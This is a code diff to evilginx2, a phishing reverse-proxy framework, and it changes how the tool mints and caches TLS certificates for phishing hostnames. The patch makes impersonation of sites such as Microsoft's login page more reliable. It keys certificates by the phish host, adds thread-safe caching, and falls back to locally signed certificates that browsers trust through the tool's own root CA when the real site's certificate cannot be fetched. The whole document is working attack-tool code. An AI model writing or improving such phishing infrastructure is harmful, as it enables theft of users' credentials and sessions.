@@ -11,9 +11,11 @@ import (
 	"fmt"
 	"io/ioutil"
 	"math/big"
+	"net"
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
@@ -28,6 +30,7 @@ type CertDb struct {
 	ns        *Nameserver
 	caCert    tls.Certificate
 	tlsCache  map[string]*tls.Certificate
+	cacheMtx  sync.RWMutex
 }
 
 func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
@@ -259,7 +262,7 @@ func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, er
 	log.Debug("Fetching TLS certificate for %s:%d ...", host, port)
 
 	config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
-	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
+	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", fmt.Sprintf("%s:%d", host, port), &config)
 	if err != nil {
 		return nil, err
 	}
@@ -274,7 +277,18 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 	var x509ca *x509.Certificate
 	var template x509.Certificate
 
-	cert, ok := o.tlsCache[host]
+	// When a phished hostname is provided, the certificate is minted for (and
+	// therefore cached under) the phish hostname so that two phishlets sharing
+	// the same origin (e.g. o365 and o3652 both proxying login.microsoftonline.com)
+	// never get served a certificate with the wrong CN/DNSNames.
+	cacheKey := phish_host
+	if cacheKey == "" {
+		cacheKey = host
+	}
+
+	o.cacheMtx.RLock()
+	cert, ok := o.tlsCache[cacheKey]
+	o.cacheMtx.RUnlock()
 	if ok {
 		return cert, nil
 	}
@@ -304,9 +318,7 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 		template.Subject.CommonName = host
 	} else {
 		srvCert, err := o.getTLSCertificate(host, port)
-		if err != nil {
-			return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
-		} else {
+		if err == nil {
 			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
 			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
 			if err != nil {
@@ -322,6 +334,31 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 				KeyUsage:              srvCert.KeyUsage,
 				ExtKeyUsage:           srvCert.ExtKeyUsage,
 				IPAddresses:           srvCert.IPAddresses,
+				DNSNames:              []string{phish_host},
+				BasicConstraintsValid: true,
+			}
+			template.Subject.CommonName = phish_host
+		} else {
+			// The upstream certificate could not be fetched (offline, filtered
+			// network, slow CDN, timeout). Fall back to a locally-issued
+			// certificate for the phish hostname instead of failing the
+			// handshake - browsers trust it because it is signed by the
+			// evilgophish root CA.
+			log.Warning("getSelfSignedCertificate: failed to fetch upstream certificate for %s:%d (%v) - using local certificate", host, port, err)
+			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+			serialNumber, rerr := rand.Int(rand.Reader, serialNumberLimit)
+			if rerr != nil {
+				return nil, rerr
+			}
+
+			template = x509.Certificate{
+				SerialNumber:          serialNumber,
+				Issuer:                x509ca.Subject,
+				Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
+				NotBefore:             time.Now(),
+				NotAfter:              time.Now().Add(time.Hour * 24 * 180),
+				KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+				ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
 				DNSNames:              []string{phish_host},
 				BasicConstraintsValid: true,
 			}
@@ -344,6 +381,8 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 		PrivateKey:  pkey,
 	}
 
-	o.tlsCache[host] = cert
+	o.cacheMtx.Lock()
+	o.tlsCache[cacheKey] = cert
+	o.cacheMtx.Unlock()
 	return cert, nil
 }
